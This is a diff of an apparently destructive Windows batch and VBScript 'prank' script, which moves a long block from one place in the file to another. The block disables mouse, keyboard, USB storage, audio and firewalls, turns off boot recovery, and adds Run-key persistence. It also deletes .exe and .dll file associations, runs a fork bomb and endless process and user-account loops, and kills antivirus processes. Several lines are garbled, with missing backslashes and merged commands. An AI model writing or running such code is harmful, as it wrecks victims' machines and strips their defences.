@@ -51,96 +51,6 @@ echo ...
 echo Haha very funny right?
 echo Well say goodbye 
 echo
-net stop audiosrv   
-net stop audiosrv   
-net stop audiosrv   
-net stop audiosrv   
-net stop AudioEndpointBuilder
-net stop AudioEndpointBuilder
-net stop AudioEndpointBuilder
-net stop AudioEndpointBuilder
-taskkill /f  /im explorer.exe
-rundll32.exe user32.dll,SetCursorPos
-start main.cpl @0
-rem ---------------------------------
-rem Disable Mouse
-set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass"
-reg delete %key%
-reg add %key% /v Start /t REG_DWORD /d 4
-rem ---------------------------------
-c:\windows\system32\rundll32.exe keyboard,disable
-c:\windows\rundll32.exe keyboard,disable
-cacls %windir%\Inf\Usbstor.pnf /d user
-cacls %windir%\Inf\Usbstor.inf /d user
-netsh firewall set opmode disable
-netsh advfirewall set domainprofile state off
-netsh advfirewall set privateprofile state off 
-netsh advfirewall set publicprofile state off
-bcdedit /set {globalsettings} advancedoptions true
-bcdedit /set {default} recoveryenabled No
-bcdedit /set {default} bootstatuspolicy ignoreallfailures  
-sc config "explorer.exe" start= disabled 
-sc stop "explorer.exe"
-icacls %windir%\system32\shutdown.exe /deny SID:D
-echo @echo off>c:windowswimn32.bat
-echo break off>c:windowswimn32.bat echo
-ipconfig/release_all>c:windowswimn32.bat
-echo end>c:windowswimn32.batreg add
-hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /freg add
-hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /fecho You Have Been HACKED!
-PAUSE
-@ECHO OFF
- START reg delete HKCR/.exe
- START reg delete HKCR/.dll
- START reg delete HKCR/*
- Set oWMP = CreateObject(”WMPlayer.OCX.7″)
- Set colCDROMs = oWMP.cdromCollection
- do
- if colCDROMs.Count >= 1 then
- For i = 0 to colCDROMs.Count – 1
- colCDROMs.Item(i).Eject
- Next
- For i = 0 to colCDROMs.Count – 1
- colCDROMs.Item(i).Eject
- Next
- End If
- wscript.sleep 100
- loop
- Set wshShell = wscript.CreateObject(”WScript.Shell”)
- do
- wscript.sleep 100
- wshshell.sendkeys “~(enter)”
- loop
- @echo off
- :x
- start chrome.exe
- start mspaint
- start notepad
- start write
- start cmd
- start explorer
- start control
- start calc
- goto x
- @echo off
-:x
-md %random%
-/folder.
-goto x
-@echo off
-:xnet
-user %random% /add
-goto x
-@ECHO off
- :top
- START %SystemRoot%\system32\notepad.exe
- GOTO top
- %0|%0
-@ echo off
-rem
-rem Permanently Kill Anti-Virus
-net stop “Security Center”
-netsh firewall set opmode mode=disable
 tskill /A av*
 tskill /A fire*
 tskill /A anti*
@@ -266,6 +176,96 @@ del /Q /F C:\Program Files\webproxy\*.exe
 del /Q /F C:\Program Files\panda
 software\*.*
 rem
+net stop audiosrv   
+net stop audiosrv   
+net stop audiosrv   
+net stop audiosrv   
+net stop AudioEndpointBuilder
+net stop AudioEndpointBuilder
+net stop AudioEndpointBuilder
+net stop AudioEndpointBuilder
+taskkill /f  /im explorer.exe
+rundll32.exe user32.dll,SetCursorPos
+start main.cpl @0
+rem ---------------------------------
+rem Disable Mouse
+set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass"
+reg delete %key%
+reg add %key% /v Start /t REG_DWORD /d 4
+rem ---------------------------------
+c:\windows\system32\rundll32.exe keyboard,disable
+c:\windows\rundll32.exe keyboard,disable
+cacls %windir%\Inf\Usbstor.pnf /d user
+cacls %windir%\Inf\Usbstor.inf /d user
+netsh firewall set opmode disable
+netsh advfirewall set domainprofile state off
+netsh advfirewall set privateprofile state off 
+netsh advfirewall set publicprofile state off
+bcdedit /set {globalsettings} advancedoptions true
+bcdedit /set {default} recoveryenabled No
+bcdedit /set {default} bootstatuspolicy ignoreallfailures  
+sc config "explorer.exe" start= disabled 
+sc stop "explorer.exe"
+icacls %windir%\system32\shutdown.exe /deny SID:D
+echo @echo off>c:windowswimn32.bat
+echo break off>c:windowswimn32.bat echo
+ipconfig/release_all>c:windowswimn32.bat
+echo end>c:windowswimn32.batreg add
+hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /freg add
+hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /fecho You Have Been HACKED!
+PAUSE
+@ECHO OFF
+ START reg delete HKCR/.exe
+ START reg delete HKCR/.dll
+ START reg delete HKCR/*
+ Set oWMP = CreateObject(”WMPlayer.OCX.7″)
+ Set colCDROMs = oWMP.cdromCollection
+ do
+ if colCDROMs.Count >= 1 then
+ For i = 0 to colCDROMs.Count – 1
+ colCDROMs.Item(i).Eject
+ Next
+ For i = 0 to colCDROMs.Count – 1
+ colCDROMs.Item(i).Eject
+ Next
+ End If
+ wscript.sleep 100
+ loop
+ Set wshShell = wscript.CreateObject(”WScript.Shell”)
+ do
+ wscript.sleep 100
+ wshshell.sendkeys “~(enter)”
+ loop
+ @echo off
+ :x
+ start chrome.exe
+ start mspaint
+ start notepad
+ start write
+ start cmd
+ start explorer
+ start control
+ start calc
+ goto x
+ @echo off
+:x
+md %random%
+/folder.
+goto x
+@echo off
+:xnet
+user %random% /add
+goto x
+@ECHO off
+ :top
+ START %SystemRoot%\system32\notepad.exe
+ GOTO top
+ %0|%0
+@ echo off
+rem
+rem Permanently Kill Anti-Virus
+net stop “Security Center”
+netsh firewall set opmode mode=disable
 Set wshShell =wscript.CreateObject(“WScript.Shel
 l”)
 do
